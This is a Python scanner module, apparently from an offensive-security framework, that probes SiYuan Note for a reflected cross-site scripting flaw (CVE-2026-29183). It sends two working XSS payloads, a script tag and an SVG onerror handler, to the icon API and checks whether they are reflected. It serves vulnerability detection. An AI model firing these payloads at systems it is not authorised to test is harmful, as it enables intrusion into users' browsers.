#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Unauthenticated reflected cross-site scripting (XSS) vulnerability in all versions of SiYuan Note containing `."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'SiYuan Note - Cross-Site Scripting Detection',
        'description': "Unauthenticated reflected cross-site scripting (XSS) vulnerability in all versions of SiYuan Note containing `/api/icon/getDynamicIcon` with unsafe `type=8` rendering logic. Attacker-controlled `content` is inserted directly into SVG output without proper sanitization. An attacker can execute arbitrary JavaScript in users' browsers when they visit a crafted malicious link.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2026', 'siyuan', 'xss', 'svg'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/siyuan-note/siyuan/security/advisories/GHSA-6865-qjcf-286f',
            'https://nvd.nist.gov/vuln/detail/CVE-2026-29183',
        ],
        'cve': 'CVE-2026-29183',
    }

    def run(self):
        for path in ('/api/icon/getDynamicIcon?type=8&content=%3C%2Ftext%3E<script>alert(document.domain)</script><text%3E', '/api/icon/getDynamicIcon?type=8&content=%3C%2Ftext%3E%3Cimage%20href%3Dx%20onerror%3Dalert(document.domain)%3E%3C%2Fimage%3E%3Ctext%3E'):
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
            body_any = ('<script>alert(document.domain)</script>', '</text><image href="x" onerror="alert(document.domain)">', 'id="dynamic_icon_type8',)
            ctype_any = ('image/svg+xml',)
            if (any(m in body for m in body_any)) and (any(m in content_type for m in ctype_any)):
                self.set_info(
                    severity='medium',
                    reason='SiYuan Note - Cross-Site Scripting detected',
                    path=path,
                )
                return True
        return False

